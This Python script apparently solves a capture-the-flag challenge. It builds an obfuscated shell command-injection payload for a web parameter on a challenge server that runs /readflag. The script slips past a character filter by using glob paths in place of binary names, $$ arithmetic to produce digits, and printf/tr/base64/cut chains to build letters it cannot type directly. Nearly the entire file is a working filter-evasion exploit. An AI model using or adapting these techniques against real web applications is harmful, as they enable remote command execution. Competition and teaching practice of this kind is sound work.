from urllib.parse import quote,unquote
from sys import stderr
from collections import deque,defaultdict

def N(v: int) -> str:
    if v == 0: return '$?'
    if v == 1: return '$(($$/$$))'
    return '$((-(' + '-$$/$$'*v + ')))'
stat = '/???/???/?tat'
hostname = '/[c-t]tc/[c-t]??t?a??'
echo = '/[a-c]??/[c-t]c[c-t][c-t]'
printf = '/?[c-t][c-t]/[a-c]??/??[c-t]?t[c-t]'
tr = '/?[c-t][c-t]/[a-c]??/t[c-t]'
lib64 = '/??[a-c]??'
sixfour = f'$({printf} ca | {tr} ttttca {lib64})'
base64 = '/???/[a-c]??/[a-c]a??'+sixfour
def char_from_path(path: str, c: str) -> str:
    arr = ['t']*len(path)
    arr[path.index(c)] = 'c'
    return f'$({printf} c | {tr} {"".join(arr)} {hidestr(path)})'
VALID = ' .cat!?/|-[]()$'
def hidestr(s: str, loose: bool=True) -> str:
    res = ''
    for c in s:
        if c in VALID: res += c
        elif c == 'b': res += '[a-c]'
        elif not loose and c in 'defghijklmnopqrs': res += '[c-t]'
        else: res += '?'
    return res
debian_version = '/etc/debian_version'
char_map = {c:c for c in VALID}
char_map['_'] = char_from_path(debian_version, '_')
char_map['s'] = char_from_path(debian_version, 's')
char_map['u'] = char_from_path('/usr/bin/cat','u')
cut = f'/???/[a-c]??/c{char_map["u"]}t'

def urlfor(*elems):
    print('http://challs.nusgreyhats.org:12325/?f='+quote(' '.join(elems)))

from base64 import b64encode as b64e
seen = defaultdict(list)
b64_map = {}
q = deque(VALID[1:])
while q:
    left = q.popleft()
    out = b64e(left.encode()).decode()
    b64_map[left] = out
    if all(c in seen for c in out): continue
    for c in out: seen[c].append(out)
    q.append(out)
b64_rev = {v:k for k,v in b64_map.items()}
def b64_chain(c):
    if c not in seen: return None
    res = [seen[c][0]]
    while res[-1] not in VALID:
        res.append(b64_rev[res[-1]])
    return res[::-1]

args = []
for c in 'P4s5_w0Rd':
    if c.isdigit(): s = N(int(c))
    elif c in char_map: s = char_map[c]
    elif (chain:=b64_chain(c)):
        s = f'$({printf} {chain[0]} |' + f' {base64} |'*(len(chain)-1) + f' {cut} -c{N(chain[-1].index(c)+1)})'
    else: raise NotImplementedError(f'{c} not found')
    args.append(s)


args = [args[i] for i in [2,7,0,8,1,3,5,4,6]]

urlfor(
    hostname,
    '|',
    echo, '$(',
        hidestr('/readflag'),
        ''.join(args),
    ')',
)
